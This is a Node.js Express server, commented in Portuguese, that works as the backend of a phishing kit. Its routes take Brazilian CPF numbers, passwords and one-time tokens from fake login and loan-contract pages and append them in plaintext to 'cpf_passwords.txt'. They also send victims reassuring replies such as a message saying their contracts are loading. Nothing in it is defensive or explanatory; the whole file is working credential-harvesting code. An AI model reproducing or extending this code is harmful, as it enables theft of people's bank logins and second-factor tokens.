// 1. Importar bibliotecas
const express = require('express');
const cors = require('cors');
const fs = require('fs'); // fs = File System, para manipular arquivos
const path = require('path'); // Módulo 'path' para lidar com caminhos de arquivos

// 2. Configurações
const app = express();
const port = process.env.PORT || 3000;
const NOME_ARQUIVO_LOG = 'cpf_passwords.txt';

// 3. Middlewares
app.use(cors());
app.use(express.json());

// Configura o Express para servir todos os arquivos estáticos da pasta 'public'
app.use(express.static(path.join(__dirname, 'public')));

// 4. Rotas da API

// Rota para capturar os dados da página de login (CPF + Senha)
app.post('/salvar-dados', (req, res) => {
    const { cpf, senha } = req.body;
    if (!cpf || !senha) {
        return res.status(400).json({ message: "Dados incompletos." });
    }

    const dataHora = new Date().toLocaleString('pt-BR');
    const linhaDeLog = `[LOGIN - ${dataHora}] - CPF: ${cpf} | Senha: ${senha}\n`;

    console.log('Dados recebidos:', linhaDeLog.trim());

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ERRO AO SALVAR NO ARQUIVO:', err);
        }
    });

    res.status(200).json({ message: 'Dados iniciais recebidos.' });
});

// Rota para capturar o pacote final (CPF + Senha + Token)
app.post('/salvar-tudo', (req, res) => {
    const { cpf, senha, token } = req.body;
    if (!cpf || !senha || !token) {
        return res.status(400).json({ message: "Dados finais incompletos." });
    }

    const dataHora = new Date().toLocaleString('pt-BR');
    const linhaDeLog = `[COMPLETO - ${dataHora}] - CPF: ${cpf} | Senha: ${senha} | Token: ${token}\n`;

    console.log('Pacote final recebido:', linhaDeLog.trim());

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ERRO AO SALVAR PACOTE FINAL:', err);
        }
        console.log('Pacote final salvo com sucesso em', NOME_ARQUIVO_LOG);
    });

    res.status(200).json({ message: 'Processo finalizado.' });
});


// Rota para capturar o CPF da página de empréstimos
app.post('/acessar-contratos', (req, res) => {
    const { cpf } = req.body;
    if (!cpf) {
        return res.status(400).json({ message: "CPF é obrigatório." });
    }

    const dataHora = new Date().toLocaleString('pt-BR');
    const linhaDeLog = `[CONTRATOS - ${dataHora}] - CPF: ${cpf}\n`;

    console.log('Dados de Contratos recebidos:', linhaDeLog.trim());

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ERRO AO SALVAR NO ARQUIVO DE CONTRATOS:', err);
        }
    });

    res.status(200).json({ message: 'Acessando seus contratos. Por favor, aguarde...' });
});


// 5. Inicia o servidor
app.listen(port, () => {
    console.log(`Servidor rodando na porta ${port}`);
    console.log(`Aguardando dados... Logs serão salvos em: "${NOME_ARQUIVO_LOG}" e exibidos neste console.`);
});